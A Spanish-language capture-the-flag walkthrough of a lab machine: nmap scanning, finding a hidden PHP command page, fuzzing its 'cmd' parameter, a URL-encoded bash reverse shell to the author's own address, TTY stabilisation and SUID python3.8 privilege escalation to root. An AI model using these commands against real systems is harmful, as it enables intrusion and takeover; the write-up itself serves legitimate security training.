Escaneo de puertos con Nmap
```
nmap -p- -sC -sV -sS --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
```

![](../../../Images/Pasted%20image%2020251030200715.png)

Observo lo que corre por el puerto 80:

![](../../../Images/Pasted%20image%2020251030200748.png)

Revisando el código fuente de esta página web al final de la primera línea me encuentro con:

![](../../../Images/Pasted%20image%2020251030201336.png)

Accederé a este posible directorio /hidden/.shell.php

![](../../../Images/Pasted%20image%2020251030201439.png)

Es una página en blanco 

No encontré nada mas relevante lo único que se me ocurre es probar en esta página si existe una RFI (Remote File Inclusion), pero me falta el parámetro principal para ver si esta parte de la web es vulnerable, la encontraré con Wfuzz
```
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://172.17.0.2/hidden/.shell.php?FUZZ=whoami' --hl 0
```

![](../../../Images/Pasted%20image%2020251030201952.png)

Ese parámetro que me falta es cmd

Procedo a explotar la RFI, por ejemplo con el comando "whoami", para ver el usuario que yo sería en la máquina:

![](../../../Images/Pasted%20image%2020251030202154.png)

Y efectivamente me respondió

Ya teniendo forma de comunicarme con la máquina procederé a pasarle como comando una Reverse Shell que apunte hacia mi Kali, pero primero Urlencodearé el comando para que la pagina web me la reconozca y sea exitosa la conexión me ayudaré de Burpsuite para ello:

![](../../../Images/Pasted%20image%2020251030203429.png)

```
bash -c "bash -i >& /dev/tcp/192.168.1.35/443 0>&1"

%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%33%35%2f%34%34%33%20%30%3e%26%31%22
```

![](../../../Images/Pasted%20image%2020251030203505.png)

La página se queda "pensando", me pongo a la escucha con Netcat:

![](../../../Images/Pasted%20image%2020251030203545.png)

Y recibo exitosamente la conexión, ahora estoy dentro de la máquina

### Tratamiento de la TTY:
```
script /dev/null -c bash 
Ctrl z
stty raw -echo; fg 
reset xterm 
export SHELL=bash
export TERM=xterm
```

![](../../../Images/Pasted%20image%2020251030203713.png)

![](../../../Images/Pasted%20image%2020251030203734.png)

## ESCALADA DE PRIVILEGIOS

Observo los binarios que contiene esta página:
```
find / -perm -4000 -ls 2>/dev/null
```

![](../../../Images/Pasted%20image%2020251030204121.png)

Me llama la atención el binario Python3.8

Ahora procederé a mirar en GTFOBins como puedo escalar con este binario en una SUID:

![](../../../Images/Pasted%20image%2020251030204145.png)

Lo ejecuto:
```
 /usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![](../../../Images/Pasted%20image%2020251030204308.png)

Y listo, ya soy ROOT
